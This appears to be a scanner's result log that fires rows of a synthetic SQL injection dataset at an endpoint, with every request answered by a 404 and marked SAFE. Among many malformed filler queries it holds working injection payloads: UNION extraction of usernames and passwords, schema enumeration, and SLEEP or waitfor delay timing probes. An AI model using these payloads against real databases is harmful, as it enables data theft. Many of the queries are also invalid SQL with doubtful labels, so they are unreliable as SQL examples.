SQL Injection Dataset Results
Start Time: 2026-04-05 15:32:05.442580

[1] SAFE | Status:404 | Time:0.008s | Payload: sql_query,injection_type,vulnerability_status,sql_command,target_table,selected_columns,comparison_operator,logical_operator,sql_comment_syntax
[16] SAFE | Status:404 | Time:0.01s | Payload: SELECT * FROM admin WHERE price != 'test@example.com' AND price != '2024-01-01',None_Type,No,SELECT,admin,*,!=,AND,
[17] SAFE | Status:404 | Time:0.009s | Payload: SELECT MIN(created_at) FROM payments WHERE id IN 'shipped' AND id IN '2024-01-01',None_Type,No,SELECT,payments,MIN(created_at),IN,AND,
[18] SAFE | Status:404 | Time:0.008s | Payload: "SELECT user_id, product_id FROM payments WHERE user_id = 'shipped' NOT user_id = 'test@example.com'",None_Type,No,SELECT,payments,"user_id, product_id",=,NOT,
[19] SAFE | Status:404 | Time:0.009s | Payload: "EXEC id, email FROM login WHERE status = 'shipped' AND status = 'test@example.com'",None_Type,No,EXEC,login,"id, email",=,AND,
[20] SAFE | Status:404 | Time:0.006s | Payload: "INSERT user_id, product_id FROM accounts WHERE updated_at BETWEEN 'safe' OR updated_at BETWEEN 1",None_Type,No,INSERT,accounts,"user_id, product_id",BETWEEN,OR,
[21] SAFE | Status:404 | Time:0.007s | Payload: SELECT COUNT(*) FROM transactions WHERE id > 1 NOT ORDER BY 30--,Error-Based,Yes,SELECT,transactions,COUNT(*),>,NOT,
[22] SAFE | Status:404 | Time:0.006s | Payload: "EXEC created_at, updated_at FROM employees WHERE updated_at >= 'pending' NOT updated_at >= 'safe'",None_Type,No,EXEC,employees,"created_at, updated_at",>=,NOT,
[23] SAFE | Status:404 | Time:0.006s | Payload: "CALL id, email FROM admin WHERE price <= '2024-01-01' OR price <= '2024-01-01'",None_Type,No,CALL,admin,"id, email",<=,OR,
[24] SAFE | Status:404 | Time:0.009s | Payload: UPDATE MAX(price) FROM users WHERE user_id <= 'shipped' OR user_id <= 'active',None_Type,No,UPDATE,users,MAX(price),<=,OR,
[25] SAFE | Status:404 | Time:0.006s | Payload: "CALL id, email FROM passwords WHERE order_id IN '2024-01-01' AND order_id IN 'safe'",None_Type,No,CALL,passwords,"id, email",IN,AND,
[26] SAFE | Status:404 | Time:0.008s | Payload: "EXEC created_at, updated_at FROM users WHERE created_at != '2024-01-01' OR created_at != 'test@example.com'",None_Type,No,EXEC,users,"created_at, updated_at",!=,OR,
[27] SAFE | Status:404 | Time:0.008s | Payload: CALL COUNT(*) FROM users WHERE updated_at IN 'active' NOT updated_at IN 'active',None_Type,No,CALL,users,COUNT(*),IN,NOT,
[28] SAFE | Status:404 | Time:0.01s | Payload: DELETE MIN(created_at) FROM credentials WHERE updated_at BETWEEN 'active' AND updated_at BETWEEN 'test@example.com',None_Type,No,DELETE,credentials,MIN(created_at),BETWEEN,AND,
[29] SAFE | Status:404 | Time:0.01s | Payload: UPDATE MIN(created_at) FROM transactions WHERE email != 'test@example.com' OR email != '2024-01-01',None_Type,No,UPDATE,transactions,MIN(created_at),!=,OR,
[30] SAFE | Status:404 | Time:0.01s | Payload: SELECT * FROM accounts WHERE order_id != 'test@example.com' NOT order_id != NULL,None_Type,No,SELECT,accounts,*,!=,NOT,
[31] SAFE | Status:404 | Time:0.009s | Payload: "SELECT COUNT(*) FROM admin WHERE id < 1 AND UNION SELECT username, password FROM users WHERE username='admin' -- #",meta_based,Yes,SELECT,admin,COUNT(*),<,AND,#
[32] SAFE | Status:404 | Time:0.006s | Payload: "SELECT created_at, updated_at FROM employees WHERE id = 1 OR 1=1 UNION SELECT 1,2,3,4 FROM mysql.db-- --",stackqueries_based,Yes,SELECT,employees,"created_at, updated_at",=,Embedded in Payload,--
[33] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM payments WHERE id > 1 LIKE ORDER BY 19-- --",Error-Based,Yes,SELECT,payments,"created_at, updated_at",>,LIKE,--
[34] SAFE | Status:404 | Time:0.007s | Payload: "INSERT price, status FROM employees WHERE id = '2024-01-01' OR id = 'shipped'",None_Type,No,INSERT,employees,"price, status",=,OR,
[35] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM users WHERE id = 1 OR 1=1 AND (SELECT 1 FROM DUAL WHERE LENGTH((SELECT database()))>0)-- --",stackqueries_based,Yes,SELECT,users,"price, status",=,Embedded in Payload,--
[36] SAFE | Status:404 | Time:0.006s | Payload: "EXEC id, email FROM employees WHERE created_at >= 'pending' AND created_at >= '2024-01-01'",None_Type,No,EXEC,employees,"id, email",>=,AND,
[37] SAFE | Status:404 | Time:0.009s | Payload: SELECT MAX(price) FROM users WHERE product_id < 'test@example.com' NOT product_id < NULL,None_Type,No,SELECT,users,MAX(price),<,NOT,
[38] SAFE | Status:404 | Time:0.007s | Payload: SELECT MIN(created_at) FROM credentials WHERE price < 'pending' AND price < 'pending',None_Type,No,SELECT,credentials,MIN(created_at),<,AND,
[39] SAFE | Status:404 | Time:0.008s | Payload: "UPDATE price, status FROM accounts WHERE updated_at > 'shipped' OR updated_at > 'safe'",None_Type,No,UPDATE,accounts,"price, status",>,OR,
[40] SAFE | Status:404 | Time:0.006s | Payload: "EXEC id, email FROM admin WHERE status > 'pending' OR status > 'safe'",None_Type,No,EXEC,admin,"id, email",>,OR,
[41] SAFE | Status:404 | Time:0.005s | Payload: "INSERT price, status FROM transactions WHERE user_id BETWEEN 'pending' NOT user_id BETWEEN 1",None_Type,No,INSERT,transactions,"price, status",BETWEEN,NOT,
[42] SAFE | Status:404 | Time:0.009s | Payload: SELECT MAX(price) FROM admin WHERE id >= 1 LIKE (SELECT * FROM (SELECT(SLEEP(5)))ecMj)# --,Time-Based,Yes,SELECT,admin,MAX(price),>=,LIKE,--
[43] SAFE | Status:404 | Time:0.006s | Payload: "INSERT id, email FROM accounts WHERE created_at >= '2024-01-01' AND created_at >= '2024-01-01'",None_Type,No,INSERT,accounts,"id, email",>=,AND,
[44] SAFE | Status:404 | Time:0.007s | Payload: "INSERT created_at, updated_at FROM sessions WHERE id <= NULL AND id <= 'test@example.com'",None_Type,No,INSERT,sessions,"created_at, updated_at",<=,AND,
[45] SAFE | Status:404 | Time:0.005s | Payload: "SELECT * FROM login WHERE id <= 1 AND "" UNION SELECT username, password FROM users WHERE username='admin' -- --",meta_based,Yes,SELECT,login,*,<=,AND,--
[46] SAFE | Status:404 | Time:0.008s | Payload: EXEC COUNT(*) FROM employees WHERE created_at = 'shipped' AND created_at = 'pending',None_Type,No,EXEC,employees,COUNT(*),=,AND,
[47] SAFE | Status:404 | Time:0.007s | Payload: "DELETE created_at, updated_at FROM payments WHERE updated_at BETWEEN '2024-01-01' AND updated_at BETWEEN NULL",None_Type,No,DELETE,payments,"created_at, updated_at",BETWEEN,AND,
[48] SAFE | Status:404 | Time:0.009s | Payload: UPDATE COUNT(*) FROM credentials WHERE product_id LIKE NULL AND product_id LIKE NULL,None_Type,No,UPDATE,credentials,COUNT(*),LIKE,AND,
[49] SAFE | Status:404 | Time:0.009s | Payload: "SELECT id, email FROM accounts WHERE id != 1 NOT "" OR 1=1 LIMIT 0, 1 -- --",meta_based,Yes,SELECT,accounts,"id, email",!=,NOT,--
[50] SAFE | Status:404 | Time:0.009s | Payload: DELETE FROM credentials WHERE id = 1 OR ORDER BY 28# #,Error-Based,Yes,DELETE,credentials,*,=,OR,#
[51] SAFE | Status:404 | Time:0.005s | Payload: "EXEC user_id, product_id FROM payments WHERE price BETWEEN 1 AND price BETWEEN 'pending'",None_Type,No,EXEC,payments,"user_id, product_id",BETWEEN,AND,
[52] SAFE | Status:404 | Time:0.009s | Payload: UPDATE credentials SET username = AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 -- WHERE id > 1 --,meta_based,Yes,UPDATE,credentials,,>,,--
[53] SAFE | Status:404 | Time:0.008s | Payload: INSERT MAX(price) FROM login WHERE email != 1 AND email != NULL,None_Type,No,INSERT,login,MAX(price),!=,AND,
[54] SAFE | Status:404 | Time:0.008s | Payload: CALL MAX(price) FROM payments WHERE created_at BETWEEN '2024-01-01' AND created_at BETWEEN 'test@example.com',None_Type,No,CALL,payments,MAX(price),BETWEEN,AND,
[55] SAFE | Status:404 | Time:0.008s | Payload: "SELECT id, email FROM passwords WHERE id > 1 OR ORDER BY 7",Union-Based,Yes,SELECT,passwords,"id, email",>,OR,
[56] SAFE | Status:404 | Time:0.008s | Payload: "INSERT id, email FROM accounts WHERE id LIKE 'active' NOT id LIKE 'active'",None_Type,No,INSERT,accounts,"id, email",LIKE,NOT,
[57] SAFE | Status:404 | Time:0.007s | Payload: "SELECT id, email FROM transactions WHERE id = 1 OR x=x #",boolean-based,Yes,SELECT,transactions,"id, email",=,,#
[58] SAFE | Status:404 | Time:0.011s | Payload: EXEC('SELECT MIN(created_at) FROM accounts WHERE id = 1 ORDER BY 12') #,Union-Based,Yes,EXEC,accounts,MIN(created_at),=,,#
[59] SAFE | Status:404 | Time:0.005s | Payload: "INSERT created_at, updated_at FROM passwords WHERE created_at != 1 NOT created_at != NULL",None_Type,No,INSERT,passwords,"created_at, updated_at",!=,NOT,
[60] SAFE | Status:404 | Time:0.011s | Payload: DELETE COUNT(*) FROM payments WHERE id >= 'active' NOT id >= 'safe',None_Type,No,DELETE,payments,COUNT(*),>=,NOT,
[61] SAFE | Status:404 | Time:0.01s | Payload: EXEC * FROM passwords WHERE status LIKE 'shipped' NOT status LIKE 'test@example.com',None_Type,No,EXEC,passwords,*,LIKE,NOT,
[62] SAFE | Status:404 | Time:0.006s | Payload: "EXEC price, status FROM credentials WHERE email < 'safe' AND email < '2024-01-01'",None_Type,No,EXEC,credentials,"price, status",<,AND,
[63] SAFE | Status:404 | Time:0.005s | Payload: DELETE COUNT(*) FROM credentials WHERE created_at != '2024-01-01' OR created_at != 'test@example.com',None_Type,No,DELETE,credentials,COUNT(*),!=,OR,
[64] SAFE | Status:404 | Time:0.007s | Payload: SELECT * FROM employees WHERE email <= 'pending' NOT email <= 'safe',None_Type,No,SELECT,employees,*,<=,NOT,
[65] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE user_id, product_id FROM users WHERE price >= 1 AND price >= 1",None_Type,No,UPDATE,users,"user_id, product_id",>=,AND,
[66] SAFE | Status:404 | Time:0.009s | Payload: UPDATE credentials SET name = 'admin' AND pg_SLEEP(5)# WHERE id = 1 --,Time-Based,Yes,UPDATE,credentials,*,=,AND,--
[67] SAFE | Status:404 | Time:0.006s | Payload: SELECT * FROM sessions WHERE id < 1 AND ORDER BY 17,Union-Based,Yes,SELECT,sessions,*,<,AND,
[68] SAFE | Status:404 | Time:0.008s | Payload: SELECT MAX(price) FROM employees WHERE product_id != NULL OR product_id != NULL,None_Type,No,SELECT,employees,MAX(price),!=,OR,
[69] SAFE | Status:404 | Time:0.013s | Payload: DELETE * FROM sessions WHERE updated_at >= 'active' OR updated_at >= 'active',None_Type,No,DELETE,sessions,*,>=,OR,
[70] SAFE | Status:404 | Time:0.01s | Payload: SELECT MIN(created_at) FROM login WHERE email IN 'pending' NOT email IN 'safe',None_Type,No,SELECT,login,MIN(created_at),IN,NOT,
[71] SAFE | Status:404 | Time:0.011s | Payload: "EXEC('SELECT user_id, product_id FROM admin WHERE id <= 1 OR 1=1 UNION SELECT database(), null, null, null--') #",stackqueries_based,Yes,EXEC,admin,"user_id, product_id",<=,Embedded in Payload,#
[72] SAFE | Status:404 | Time:0.006s | Payload: DELETE COUNT(*) FROM payments WHERE price < NULL OR price < 'test@example.com',None_Type,No,DELETE,payments,COUNT(*),<,OR,
[73] SAFE | Status:404 | Time:0.009s | Payload: SELECT COUNT(*) FROM sessions WHERE id <= 1 AND AND 1=1 ORDER BY 1 -- #,meta_based,Yes,SELECT,sessions,COUNT(*),<=,AND,#
[74] SAFE | Status:404 | Time:0.009s | Payload: "EXEC('SELECT * FROM transactions WHERE id < 1 OR 3409=3409 AND (1=0) AND (ASCII(SUBSTRING('admin',2,1)) = 100) -- Check for 'd'')",boolean-based,Yes,EXEC,transactions,*,<,,
[75] SAFE | Status:404 | Time:0.009s | Payload: "SELECT id, email FROM payments WHERE id > 'active' NOT id > NULL",None_Type,No,SELECT,payments,"id, email",>,NOT,
[76] SAFE | Status:404 | Time:0.008s | Payload: "DELETE user_id, product_id FROM transactions WHERE email LIKE 1 NOT email LIKE 'safe'",None_Type,No,DELETE,transactions,"user_id, product_id",LIKE,NOT,
[77] SAFE | Status:404 | Time:0.005s | Payload: "SELECT user_id, product_id FROM payments WHERE email >= 'safe' OR email >= 'test@example.com'",None_Type,No,SELECT,payments,"user_id, product_id",>=,OR,
[78] SAFE | Status:404 | Time:0.007s | Payload: "INSERT price, status FROM passwords WHERE id > '2024-01-01' AND id > 'pending'",None_Type,No,INSERT,passwords,"price, status",>,AND,
[79] SAFE | Status:404 | Time:0.008s | Payload: DELETE FROM employees WHERE id > 1 AND ORDER BY 26,Union-Based,Yes,DELETE,employees,*,>,AND,
[80] SAFE | Status:404 | Time:0.006s | Payload: DELETE MIN(created_at) FROM passwords WHERE email >= '2024-01-01' NOT email >= 'safe',None_Type,No,DELETE,passwords,MIN(created_at),>=,NOT,
[81] SAFE | Status:404 | Time:0.009s | Payload: CALL COUNT(*) FROM login WHERE product_id LIKE '2024-01-01' AND product_id LIKE 'pending',None_Type,No,CALL,login,COUNT(*),LIKE,AND,
[82] SAFE | Status:404 | Time:0.008s | Payload: "DELETE price, status FROM admin WHERE id IN 'safe' OR id IN 'shipped'",None_Type,No,DELETE,admin,"price, status",IN,OR,
[83] SAFE | Status:404 | Time:0.008s | Payload: "EXEC('SELECT created_at, updated_at FROM accounts WHERE id = 1 OR ORDER BY 18') #",Union-Based,Yes,EXEC,accounts,"created_at, updated_at",=,OR,#
[84] SAFE | Status:404 | Time:0.007s | Payload: "DELETE price, status FROM payments WHERE user_id > 'shipped' NOT user_id > '2024-01-01'",None_Type,No,DELETE,payments,"price, status",>,NOT,
[85] SAFE | Status:404 | Time:0.004s | Payload: CALL COUNT(*) FROM payments WHERE price >= 1 AND price >= '2024-01-01',None_Type,No,CALL,payments,COUNT(*),>=,AND,
[86] SAFE | Status:404 | Time:0.006s | Payload: SELECT COUNT(*) FROM payments WHERE id < 1 ORDER BY 19-- #,Error-Based,Yes,SELECT,payments,COUNT(*),<,,#
[87] SAFE | Status:404 | Time:0.007s | Payload: DELETE MIN(created_at) FROM login WHERE user_id > 'test@example.com' NOT user_id > 'pending',None_Type,No,DELETE,login,MIN(created_at),>,NOT,
[88] SAFE | Status:404 | Time:0.01s | Payload: "CALL price, status FROM transactions WHERE order_id < 1 NOT order_id < NULL",None_Type,No,CALL,transactions,"price, status",<,NOT,
[89] SAFE | Status:404 | Time:0.011s | Payload: "SELECT user_id, product_id FROM transactions WHERE id <= 1 AND "" UNION SELECT null, null, null, table_name FROM information_schema.tables -- #",meta_based,Yes,SELECT,transactions,"user_id, product_id",<=,AND,#
[90] SAFE | Status:404 | Time:0.01s | Payload: DELETE COUNT(*) FROM transactions WHERE email <= '2024-01-01' AND email <= '2024-01-01',None_Type,No,DELETE,transactions,COUNT(*),<=,AND,
[91] SAFE | Status:404 | Time:0.008s | Payload: "EXEC created_at, updated_at FROM transactions WHERE status LIKE 'pending' AND status LIKE 'test@example.com'",None_Type,No,EXEC,transactions,"created_at, updated_at",LIKE,AND,
[92] SAFE | Status:404 | Time:0.008s | Payload: "CALL user_id, product_id FROM transactions WHERE id IN 'safe' OR id IN 'active'",None_Type,No,CALL,transactions,"user_id, product_id",IN,OR,
[93] SAFE | Status:404 | Time:0.007s | Payload: "UPDATE price, status FROM admin WHERE user_id IN 1 OR user_id IN '2024-01-01'",None_Type,No,UPDATE,admin,"price, status",IN,OR,
[94] SAFE | Status:404 | Time:0.005s | Payload: "DELETE created_at, updated_at FROM employees WHERE email IN 'active' NOT email IN 'test@example.com'",None_Type,No,DELETE,employees,"created_at, updated_at",IN,NOT,
[95] SAFE | Status:404 | Time:0.009s | Payload: UPDATE MAX(price) FROM payments WHERE created_at <= 'shipped' OR created_at <= NULL,None_Type,No,UPDATE,payments,MAX(price),<=,OR,
[96] SAFE | Status:404 | Time:0.011s | Payload: "DELETE id, email FROM employees WHERE email >= 1 AND email >= 1",None_Type,No,DELETE,employees,"id, email",>=,AND,
[97] SAFE | Status:404 | Time:0.008s | Payload: EXEC MAX(price) FROM payments WHERE created_at IN 1 NOT created_at IN 'active',None_Type,No,EXEC,payments,MAX(price),IN,NOT,
[98] SAFE | Status:404 | Time:0.009s | Payload: "INSERT created_at, updated_at FROM users WHERE product_id >= 1 AND product_id >= 1",None_Type,No,INSERT,users,"created_at, updated_at",>=,AND,
[99] SAFE | Status:404 | Time:0.009s | Payload: SELECT * FROM payments WHERE id >= 1 AND ORDER BY 5-- #,Error-Based,Yes,SELECT,payments,*,>=,AND,#
[100] SAFE | Status:404 | Time:0.011s | Payload: INSERT MIN(created_at) FROM transactions WHERE product_id BETWEEN 'pending' OR product_id BETWEEN 'pending',None_Type,No,INSERT,transactions,MIN(created_at),BETWEEN,OR,
[101] SAFE | Status:404 | Time:0.007s | Payload: "SELECT MAX(price) FROM accounts WHERE id >= 1 LIKE "" OR (SELECT COUNT(*) FROM users WHERE username='admin') = 1 -- --",meta_based,Yes,SELECT,accounts,MAX(price),>=,LIKE,--
[102] SAFE | Status:404 | Time:0.008s | Payload: "CALL id, email FROM sessions WHERE updated_at BETWEEN 'test@example.com' NOT updated_at BETWEEN '2024-01-01'",None_Type,No,CALL,sessions,"id, email",BETWEEN,NOT,
[103] SAFE | Status:404 | Time:0.012s | Payload: "SELECT id, email FROM transactions WHERE product_id = 'pending' OR product_id = 'active'",None_Type,No,SELECT,transactions,"id, email",=,OR,
[104] SAFE | Status:404 | Time:0.011s | Payload: SELECT MIN(created_at) FROM accounts WHERE product_id BETWEEN 'pending' OR product_id BETWEEN 'pending',None_Type,No,SELECT,accounts,MIN(created_at),BETWEEN,OR,
[105] SAFE | Status:404 | Time:0.009s | Payload: SELECT MAX(price) FROM accounts WHERE created_at > 'active' NOT created_at > 'safe',None_Type,No,SELECT,accounts,MAX(price),>,NOT,
[106] SAFE | Status:404 | Time:0.008s | Payload: INSERT COUNT(*) FROM transactions WHERE email IN 'shipped' OR email IN 'pending',None_Type,No,INSERT,transactions,COUNT(*),IN,OR,
[107] SAFE | Status:404 | Time:0.006s | Payload: SELECT COUNT(*) FROM employees WHERE id < 1 OR 1=1 AND (SELECT COUNT(*) FROM users)>0-- #,stackqueries_based,Yes,SELECT,employees,COUNT(*),<,Embedded in Payload,#
[108] SAFE | Status:404 | Time:0.006s | Payload: SELECT MIN(created_at) FROM transactions WHERE id < 1 OR OR (SELECT COUNT(*) FROM users WHERE username='admin') = 1 AND SLEEP(5) -- #,meta_based,Yes,SELECT,transactions,MIN(created_at),<,OR,#
[109] SAFE | Status:404 | Time:0.006s | Payload: "INSERT id, email FROM passwords WHERE status IN '2024-01-01' NOT status IN NULL",None_Type,No,INSERT,passwords,"id, email",IN,NOT,
[110] SAFE | Status:404 | Time:0.005s | Payload: "INSERT user_id, product_id FROM passwords WHERE status != 'test@example.com' AND status != 'pending'",None_Type,No,INSERT,passwords,"user_id, product_id",!=,AND,
[111] SAFE | Status:404 | Time:0.004s | Payload: "EXEC id, email FROM users WHERE updated_at = '2024-01-01' AND updated_at = 1",None_Type,No,EXEC,users,"id, email",=,AND,
[112] SAFE | Status:404 | Time:0.006s | Payload: "DELETE id, email FROM login WHERE user_id != 'pending' AND user_id != 1",None_Type,No,DELETE,login,"id, email",!=,AND,
[113] SAFE | Status:404 | Time:0.006s | Payload: SELECT * FROM transactions WHERE id > 1 OR ORDER BY 11# --,Error-Based,Yes,SELECT,transactions,*,>,OR,--
[114] SAFE | Status:404 | Time:0.006s | Payload: CALL MAX(price) FROM users WHERE created_at LIKE 'pending' OR created_at LIKE 'safe',None_Type,No,CALL,users,MAX(price),LIKE,OR,
[115] SAFE | Status:404 | Time:0.008s | Payload: "CALL created_at, updated_at FROM credentials WHERE id IN 'pending' NOT id IN 'active'",None_Type,No,CALL,credentials,"created_at, updated_at",IN,NOT,
[116] SAFE | Status:404 | Time:0.005s | Payload: "SELECT created_at, updated_at FROM login WHERE id >= 1 LIKE ORDER BY 15-- --",Error-Based,Yes,SELECT,login,"created_at, updated_at",>=,LIKE,--
[117] SAFE | Status:404 | Time:0.006s | Payload: INSERT MIN(created_at) FROM transactions WHERE status BETWEEN 1 OR status BETWEEN 1,None_Type,No,INSERT,transactions,MIN(created_at),BETWEEN,OR,
[118] SAFE | Status:404 | Time:0.004s | Payload: "INSERT INTO sessions (id, username) VALUES (1, ';waitfor delay '0:0:5'--) --",Time-Based,Yes,INSERT,sessions,*,=,,--
[119] SAFE | Status:404 | Time:0.004s | Payload: UPDATE MIN(created_at) FROM accounts WHERE created_at LIKE NULL NOT created_at LIKE '2024-01-01',None_Type,No,UPDATE,accounts,MIN(created_at),LIKE,NOT,
[120] SAFE | Status:404 | Time:0.005s | Payload: "CALL created_at, updated_at FROM users WHERE order_id = 'safe' AND order_id = 'active'",None_Type,No,CALL,users,"created_at, updated_at",=,AND,
[121] SAFE | Status:404 | Time:0.005s | Payload: SELECT * FROM transactions WHERE id <= 1 or SLEEP(5)=' --,Time-Based,Yes,SELECT,transactions,*,<=,,--
[122] SAFE | Status:404 | Time:0.004s | Payload: CALL COUNT(*) FROM users WHERE status > 'active' AND status > '2024-01-01',None_Type,No,CALL,users,COUNT(*),>,AND,
[123] SAFE | Status:404 | Time:0.007s | Payload: SELECT MIN(created_at) FROM accounts WHERE id < 1 NOT ');waitfor delay '0:0:5'-- #,Time-Based,Yes,SELECT,accounts,MIN(created_at),<,NOT,#
[124] SAFE | Status:404 | Time:0.005s | Payload: CALL MIN(created_at) FROM passwords WHERE id > '2024-01-01' OR id > 'test@example.com',None_Type,No,CALL,passwords,MIN(created_at),>,OR,
[125] SAFE | Status:404 | Time:0.004s | Payload: INSERT MIN(created_at) FROM login WHERE price <= 'safe' AND price <= 'active',None_Type,No,INSERT,login,MIN(created_at),<=,AND,
[126] SAFE | Status:404 | Time:0.006s | Payload: SELECT MIN(created_at) FROM accounts WHERE user_id >= '2024-01-01' NOT user_id >= '2024-01-01',None_Type,No,SELECT,accounts,MIN(created_at),>=,NOT,
[127] SAFE | Status:404 | Time:0.006s | Payload: "CALL created_at, updated_at FROM passwords WHERE status > NULL NOT status > 'pending'",None_Type,No,CALL,passwords,"created_at, updated_at",>,NOT,
[128] SAFE | Status:404 | Time:0.005s | Payload: "DELETE price, status FROM credentials WHERE user_id < 'shipped' OR user_id < 'safe'",None_Type,No,DELETE,credentials,"price, status",<,OR,
[129] SAFE | Status:404 | Time:0.007s | Payload: DELETE MAX(price) FROM sessions WHERE product_id < 'safe' NOT product_id < '2024-01-01',None_Type,No,DELETE,sessions,MAX(price),<,NOT,
[130] SAFE | Status:404 | Time:0.005s | Payload: "INSERT user_id, product_id FROM transactions WHERE price >= 'active' OR price >= 'active'",None_Type,No,INSERT,transactions,"user_id, product_id",>=,OR,
[131] SAFE | Status:404 | Time:0.006s | Payload: "SELECT user_id, product_id FROM employees WHERE updated_at IN 'pending' NOT updated_at IN 'safe'",None_Type,No,SELECT,employees,"user_id, product_id",IN,NOT,
[132] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE price, status FROM login WHERE updated_at != 'shipped' OR updated_at != NULL",None_Type,No,UPDATE,login,"price, status",!=,OR,
[133] SAFE | Status:404 | Time:0.006s | Payload: "EXEC price, status FROM transactions WHERE updated_at <= 'active' NOT updated_at <= '2024-01-01'",None_Type,No,EXEC,transactions,"price, status",<=,NOT,
[134] SAFE | Status:404 | Time:0.009s | Payload: "DELETE created_at, updated_at FROM accounts WHERE updated_at > 'active' AND updated_at > NULL",None_Type,No,DELETE,accounts,"created_at, updated_at",>,AND,
[135] SAFE | Status:404 | Time:0.006s | Payload: CALL * FROM sessions WHERE product_id != 'safe' AND product_id != 'shipped',None_Type,No,CALL,sessions,*,!=,AND,
[136] SAFE | Status:404 | Time:0.01s | Payload: UPDATE COUNT(*) FROM sessions WHERE id < 'test@example.com' OR id < '2024-01-01',None_Type,No,UPDATE,sessions,COUNT(*),<,OR,
[137] SAFE | Status:404 | Time:0.008s | Payload: "SELECT user_id, product_id FROM sessions WHERE id = 1 OR ORDER BY 3# #",Error-Based,Yes,SELECT,sessions,"user_id, product_id",=,OR,#
[138] SAFE | Status:404 | Time:0.013s | Payload: "INSERT price, status FROM employees WHERE id LIKE 'shipped' OR id LIKE 1",None_Type,No,INSERT,employees,"price, status",LIKE,OR,
